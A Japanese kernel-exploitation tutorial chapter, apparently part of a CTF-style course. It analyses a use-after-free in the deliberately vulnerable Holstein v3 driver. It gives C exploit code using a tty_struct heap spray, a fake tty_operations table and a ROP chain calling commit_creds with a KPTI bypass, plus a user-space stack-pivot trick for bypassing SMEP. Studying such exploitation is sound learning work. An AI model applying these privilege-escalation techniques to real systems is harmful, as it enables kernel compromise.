---
title: "Holstein v3: Use-after-Freeの悪用"
tags:
    - [Linux]
    - [Kernel]
    - [Use-after-Free]
lang: ja
---
前章ではHolsteinモジュールのHeap Overflowを悪用して権限昇格をしました。またもやHolsteinモジュールの開発者は脆弱性を修正し、Holstein v3を公開しました。本章では、改善されたHolsteinモジュールv3をexploitしていきます。

<div class="column" title="目次">
<!-- toc --><br>
</div>

## パッチの解析と脆弱性の調査
まずは[Holstein v3](distfiles/LK01-3.tar.gz)をダウンロードしてください。
v2との差分は主に2点あります。まず、`open`でのバッファ確保時に`kzalloc`が使われています。
```c
  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }
```
`kzalloc`は`kmalloc`と同じくカーネルのヒープから領域を確保しますが、その後内容が0で埋められるという点が違います。つまり、`malloc`に対する`calloc`のような位置付けの関数が`kzalloc`です。
次に、`read`と`write`においてHeap Overflowが起きないようにサイズチェックがあります。
```c
static ssize_t module_read(struct file *file,
                           char __user *buf, size_t count,
                           loff_t *f_pos)
{
  printk(KERN_INFO "module_read called\n");

  if (count > BUFFER_SIZE) {
    printk(KERN_INFO "invalid buffer size\n");
    return -EINVAL;
  }

  if (copy_to_user(buf, g_buf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}

static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  printk(KERN_INFO "module_write called\n");

  if (count > BUFFER_SIZE) {
    printk(KERN_INFO "invalid buffer size\n");
    return -EINVAL;
  }

  if (copy_from_user(g_buf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }

  return count;
}
```
したがって、今回のカーネルモジュールではHeap Overflowが起こせません。

ここで`close`の実装を見てみましょう。
```c
static int module_close(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_close called\n");
  kfree(g_buf);
  return 0;
}
```
`g_buf`が不要になったので`kfree`で解放していますが、`g_buf`にはまだポインタが入ったままです。もし`close`した後に`g_buf`を使えたら、Use-after-Freeが起きます。

読者の中には「でも`close`したら、そのfdに対しては`read`も`write`もできないからUse-after-Freeは起きない」と考えた方もいることでしょう。たしかにその通りですが、ここでカーネル空間で動作するプログラムの特徴を思い出してみましょう。

カーネル空間では、同じリソースを複数のプログラムが共有できます。Holsteinモジュールも、1プログラムだけが`open`できるのではなく、複数のプログラム（あるいは1つのプログラム）が複数回`open`できます。では、もし次のような使い方をしたらどうなるでしょうか。
```c
int fd1 = open("/dev/holstein", O_RDWR);
int fd2 = open("/dev/holstein", O_RDWR);
close(fd1);
write(fd2, "Hello", 5);
```
最初の`open`で`g_buf`が確保されますが、次にまた`open`するため、`g_buf`は新しいバッファで置き換えられます。（古い`g_buf`は解放されないまま残り、メモリリークが起きます。）次に`fd1`を`close`するため、ここで`g_buf`が解放されます。`close`した段階で`fd1`は使えなくなりますが、`fd2`はまだ有効なので、`fd2`に対して読み書きができます。すると、既に解放したはずの`g_buf`が操作できてしまい、Use-after-Freeが発生することが分かります。

このように、カーネル空間のプログラムは**複数のプログラムにリソースが共有される**という点に注意して設計しないと、簡単に脆弱性が生まれてしまいます。

<div class="balloon_l">
  <div class="faceicon"><img src="../img/cow.jpg" alt="牛さん" ></div>
  <p class="says">
    closeする時にポインタをNULLで消したり、openする時にg_bufが確保済みなら失敗するような設計にすれば、少なくとも今回のような簡単な脆弱性は防げたね。
  </p>
</div>

## KASLRの回避
手始めにカーネルのベースアドレスと`g_buf`のアドレスをリークしてみましょう。
脆弱性がUse-after-Freeになっただけで、今回もバッファサイズが0x400なので`tty_struct`が使えます。

## kROPの実現
これでROPができる状態になりました。偽の`tty_operations`を用意してROP chainにstack pivotするだけです。
しかし、前回と違いUse-after-Freeですので、今使える領域が`tty_struct`と被っています。当然`ioctl`などで`tty_operations`を使うとき、`tty_struct`にも参照されない変数がたくさんあり、そこをROP chainの領域や偽の`tty_operations`として使っても構いません。ただ、これから攻撃に使おうとしている構造体の大部分を破壊してしまうのは後々意図しないバグを生み出してしまう可能性がある上、ROP chainのサイズや構造に大幅な制限が加わってしまうこともあります。なるべく`tty_struct`とROP chainは別の領域に確保したいです。
そこで、今回は2回目のUse-after-Freeを起こします。といっても`g_buf`は1つなので、まずアドレスが分かっている今の`g_buf`にROP chainと偽の`tty_operations`を書き込みます。次に別でUse-after-Freeを起こし、そちらの`tty_struct`の関数テーブルを書き換えます。こうすれば`tty_struct`の関数テーブルのみを書き換えるので、安定したexploitが実現できます。
```c
  // ROP chain
  unsigned long *chain = (unsigned long*)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  // 偽tty_operations
  *(unsigned long*)&buf[0x3f8] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;

  write(fd2, buf, 0x400);

  // 2回目のUse-after-Free
  int fd3 = open("/dev/holstein", O_RDWR);
  int fd4 = open("/dev/holstein", O_RDWR);
  if (fd3 == -1 || fd4 == -1)
    fatal("/dev/holstein");
  close(fd3);
  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  // 関数テーブルのポインタを書き換える
  read(fd4, buf, 0x400);
  *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
  write(fd4, buf, 0x20);

  // RIP制御
  for (int i = 50; i < 100; i++) {
    ioctl(spray[i], 0, g_buf - 8); // rsp=rdx; pop rbp;
  }
```

権限昇格できていれば成功です。このexploitは[ここ](exploit/uaf-krop.c)からダウンロードできます。

<center>
  <img src="img/uaf_privesc.png" alt="UAFによる権限昇格" style="width:320px;">
</center>

このように、Heap OverflowやUse-after-Freeといった脆弱性は、カーネル空間では多くの場合ユーザー空間の同じ脆弱性よりも簡単に攻撃可能です。
これはカーネルのヒープが共有されており、関数ポインタなどを持ついろんな構造体を攻撃に利用できるからです。逆に言えば、Heap BOFやUAFが起きるオブジェクトと同じサイズ帯で悪用できる構造体を見つけられなければ、exploitは困難になります。

## おまけ：RIP制御とSMEPの回避
今回はすべてのセキュリティ機構を回避しました。
[前章](stack_overflow.html)でも少しだけ話が出ましたが、SMAPが無効でSMEPが有効なときは今までと少し違う簡単な手法が使えます。RIP制御が実現できたとき、次のようなgadgetを使うとどうなるでしょうか。
```
0xffffffff81516264: mov esp, 0x39000000; ret;
```
あらかじめユーザー空間の0x39000000をmmapで確保してROP chainを書き込んでおき、このgadgetを呼び出すとstack pivotとしてユーザー空間に設置したROP chainが走ります。つまり、この場合カーネル空間にROP chainを置いたり、そのヒープ領域のアドレスを取得したりといった面倒事が不要になります。

注意として、RSPは8バイト単位でアラインされたアドレスになるようにしてください。スタックポインタがアラインされていないと例外を発生するような命令が実行されてしまうとクラッシュしてしまうからです。

実際にSMAPを無効にして、このようなgadgetでユーザー空間のROP chainにstack pivotして権限昇格してみてください。なお、pivot先のメモリをmmapする際に`MAP_POPULATE`フラグを付けるようにしましょう。これを付けることで物理メモリが確保され、KPTIが有効でもこのマップをカーネルから見られるようになります。

[^1]: 後の章で登場しますが、eBPFという機能のJITが有効なとき、カーネル空間でRIP制御ができれば、高い確率で権限昇格するexploitが実現できます。

---

<div class="column" title="例題1">
  <code>modprobe_path</code>の書き換えや<code>cred</code>構造体の書き換えなどの、ROPを使わない方法でも権限昇格してみましょう。<br>
</div>
